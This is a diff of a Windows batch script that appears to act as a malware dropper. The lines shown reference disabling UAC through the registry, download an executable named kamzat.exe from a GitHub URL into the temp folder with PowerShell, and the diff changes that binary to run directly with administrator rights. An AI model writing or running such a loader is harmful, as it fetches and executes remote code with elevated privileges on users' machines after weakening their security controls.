@@ -16,6 +16,7 @@ if %errorlevel% equ 0 (
         timeout /t 3 >nul
         goto :loop
     )
+    exit /b
 
 :admin_tasks
 :: Disable UAC through registry
@@ -28,8 +29,8 @@ powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/boycots563
 if exist "%TEMP%\kamzat.exe" (
     :: Ensure the file is fully downloaded by checking its accessibility
     type nul >> "%TEMP%\kamzat.exe" 2>nul && (
-        :: Run the downloaded file
-        start "" /B "%TEMP%\kamzat.exe"
+        :: Run the downloaded file WITH ADMIN RIGHTS (current batch already has admin rights)
+        "%TEMP%\kamzat.exe"
         
         :: Wait briefly to ensure the file has started
         ping -n 3 127.0.0.1 >nul
